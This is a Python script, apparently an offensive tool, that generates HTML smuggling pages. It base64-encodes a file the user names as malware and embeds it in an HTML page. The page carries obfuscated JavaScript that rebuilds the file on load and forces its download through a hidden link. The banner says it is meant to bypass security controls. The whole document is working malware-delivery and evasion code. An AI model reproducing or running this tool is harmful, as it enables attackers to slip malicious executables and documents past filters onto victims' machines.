# Author: Pari Malam

import random
import string
import sys
import os
import base64
from sys import stdout
from colorama import Fore

# Constants for colors and styles
CYAN = "\033[96m\033[1m"
GREEN = "\033[92m\033[1m"
MAGENTA = "\033[95m\033[1m"
WHITE = "\033[97m\033[1m"
ERROR = "\033[91m\033[1m"
BLUE = "\033[94m\033[1m"
RESET = "\033[0m"

def banners():
    os.system('clear' if os.name == 'posix' else 'cls')
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/THATNOTEASY                        "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[HTML-SMUGGLING] - {Fore.GREEN}BYPASS STANDARD PARAMETER SECURITY")
banners()

def dirdar():
    if not os.path.exists('Results'):
        os.mkdir('Results')
dirdar()

def random_sequences():
    randoms = []
    for _ in range(0, 19):
        while True:
            uniqu = True
            ntmp1 = random.sample(string.ascii_lowercase, k=2)
            ntmp22 = random.sample(string.digits, k=2)
            ntmp2 = random.sample(string.ascii_lowercase, k=5)
            nub_tmp = ntmp1[0] + ntmp1[1] + ntmp22[0] + ntmp22[1] + ntmp2[2] + ntmp2[3] + ntmp2[3] + ntmp2[4]
            for tmp in randoms:
                if tmp == nub_tmp:
                    uniqu = False
                    break
            if uniqu:
                randoms.append(nub_tmp)
                break
    return randoms

def parse_arguments(output_script):
    argv = sys.argv
    number = len(argv)
    if number == 3:
        filename = argv[1].replace('"', "")
        filepath = argv[2].replace('"', "")
    else:
        program = os.path.basename(argv[0])
        print(f"\n{WHITE}\tExample Usage: ")
        print(f"\t{BLUE}{WHITE}{program} {GREEN}<FileName> {MAGENTA}<MalwarePath>{RESET}")
        print(RESET)
        print(RESET)
        c = f"""
        {CYAN}{program}\t{GREEN}FileName.exe\t{MAGENTA}pathfile{WHITE}\malware.exe{RESET}
        {CYAN}{program}\t{GREEN}FileName.dll\t{MAGENTA}pathfile{WHITE}\malware.dll{RESET}
        {CYAN}{program}\t{GREEN}FileName.pdf\t{MAGENTA}pathfile{WHITE}\malware.pdf{RESET}
        {CYAN}{program}\t{GREEN}FileName.docx\t{MAGENTA}pathfile{WHITE}\malware.docx{RESET}
          """
        print(c)
        print(RESET)
        print()
        sys.exit(0)

    check_file_exist = os.access(filepath, os.F_OK)
    try:
        with open(file=output_script, encoding='utf-8', mode='w') as wfile:
            wfile.write("Trial")
        os.remove(output_script)
        check_write_permission = True
    except:
        check_write_permission = False

    if check_file_exist:
        if check_write_permission:
            return filename, filepath
        else:
            print(f"\n\t[{ERROR}!{RESET}]{WHITE}You Do not have permission to write or delete this file!\n")
            sys.exit(0)
    else:
        print(f"\n\t[{ERROR}!{RESET}]{WHITE}The file not found{ERROR}!{RESET}\n")
        sys.exit(0)

def main():
    output_script = "script.txt"
    try:
        file_name, filepath = parse_arguments(output_script)
    except:
        sys.exit(0)

    try:
        with open(file=filepath, mode='rb') as rbfile:
            file_bytes = rbfile.read()

        data_base64_bytes = base64.b64encode(file_bytes)
        del file_bytes, filepath
        file_base64 = data_base64_bytes.decode(encoding='UTF-8')
        del data_base64_bytes

        randoms = random_sequences()
        x = """ 
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
</head>
<body>
        """
        y = """ 
</body>
</html>
"""
        template = x+'\n'+ """<script> var """ + randoms[0] + """=""" + randoms[0] + """;(function(""" + randoms[1] + """,""" + randoms[
            2] + """){var """ + randoms[3] + """=""" + randoms[0] + """,""" + randoms[4] + """=""" + randoms[
                       1] + """();while(!![]){try{var """ + randoms[5] + """=-parseInt(""" + randoms[
                       3] + """(0x1b1))/0x1+-parseInt(""" + randoms[3] + """(0x1a7))/0x2+parseInt(""" + randoms[
                       3] + """(0x1b3))/0x3+-parseInt(""" + randoms[3] + """(0x1bd))/0x4*(parseInt(""" + randoms[
                       3] + """(0x1b6))/0x5)+parseInt(""" + randoms[3] + """(0x1b4))/0x6*(parseInt(""" + randoms[
                       3] + """(0x1a8))/0x7)+parseInt(""" + randoms[3] + """(0x1b9))/0x8+-parseInt(""" + randoms[
                       3] + """(0x1b7))/0x9;if(""" + randoms[5] + """===""" + randoms[2] + """)break;else """ + randoms[
                       4] + """['push'](""" + randoms[4] + """['shift']());}catch(""" + randoms[6] + """){""" + randoms[
                       4] + """['push'](""" + randoms[4] + """['shift']());}}}(""" + randoms[7] + """,0x291fa));function """ + \
                   randoms[7] + """(){var """ + randoms[
                       8] + """=['revokeObjectURL','508149iyQTpI','216tZOcWE','octet/stream','500685VYAZHK','2271357zoKGKP','length','2630616khEGdN','body','download','atob','4kKgjnM','createElement','214758lzjpsQ','44093NNfoUz','appendChild','buffer','URL','display:\\x20none','click','charCodeAt','href','""" + file_name + """','96643zAJuKG'];""" + \
                   randoms[7] + """=function(){return """ + randoms[8] + """;};return """ + randoms[7] + """();}var """ + randoms[
                       13] + """='""" + file_base64 + """',""" + randoms[14] + """=window[""" + randoms[0] + """(0x1bc)](""" + \
                   randoms[13] + """),""" + randoms[15] + """=new Uint8Array(""" + randoms[14] + """[""" + randoms[
                       0] + """(0x1b8)]);for(var i=0x0;i<""" + randoms[14] + """[""" + randoms[0] + """(0x1b8)];i++){""" + randoms[
                       15] + """[i]=""" + randoms[14] + """[""" + randoms[0] + """(0x1ae)](i);}function """ + randoms[0] + """(""" + \
                   randoms[10] + """,""" + randoms[12] + """){var """ + randoms[7] + """46=""" + randoms[7] + """();return """ + randoms[
                       0] + """=function(""" + randoms[0] + """ed,""" + randoms[9] + """){""" + randoms[0] + """ed=""" + randoms[
                       0] + """ed-0x1a7;var """ + randoms[11] + """=""" + randoms[7] + """46[""" + randoms[0] + """ed];return """ + \
                   randoms[11] + """;},""" + randoms[0] + """(""" + randoms[10] + """,""" + randoms[12] + """);}var """ + randoms[
                       16] + """=new Blob([""" + randoms[15] + """[""" + randoms[0] + """(0x1aa)]],{'type':""" + randoms[
                       0] + """(0x1b5)}),""" + randoms[17] + """=document[""" + randoms[0] + """(0x1be)]('a'),""" + randoms[
                       18] + """=window[""" + randoms[0] + """(0x1ab)]['createObjectURL'](""" + randoms[16] + """);document[""" + \
                   randoms[0] + """(0x1ba)][""" + randoms[0] + """(0x1a9)](""" + randoms[17] + """),""" + randoms[
                       17] + """['style']=""" + randoms[0] + """(0x1ac),""" + randoms[17] + """[""" + randoms[0] + """(0x1af)]=""" + \
                   randoms[18] + """,""" + randoms[17] + """[""" + randoms[0] + """(0x1bb)]=""" + randoms[0] + """(0x1b0),""" + randoms[
                       17] + """[""" + randoms[0] + """(0x1ad)](),window[""" + randoms[0] + """(0x1ab)][""" + randoms[
                       0] + """(0x1b2)](""" + randoms[18] + """); </script>"""+'\n'+y
        del file_name, file_base64, randoms
        with open(file=output_script, encoding='utf-8', mode="w") as wfile:
            wfile.write(template)
        with open("Templates/template.html", "w", encoding="utf-8") as mido_html:
            mido_html.write(template)

        print(f'\n\t{WHITE}[{BLUE}+{WHITE}] The {ERROR}{WHITE}Template.html{RESET} {WHITE}file has been created {GREEN}successfully.{RESET}')
        print(f'\t{WHITE}[{BLUE}+{WHITE}] Script File: {ERROR}{WHITE}"jscode.txt" {RESET}\n')
    except Exception as e:
        print(e)
        print(f'\n\t{ERROR}An unexpected error has occurred!{RESET}\n')

if __name__ == '__main__':
    main()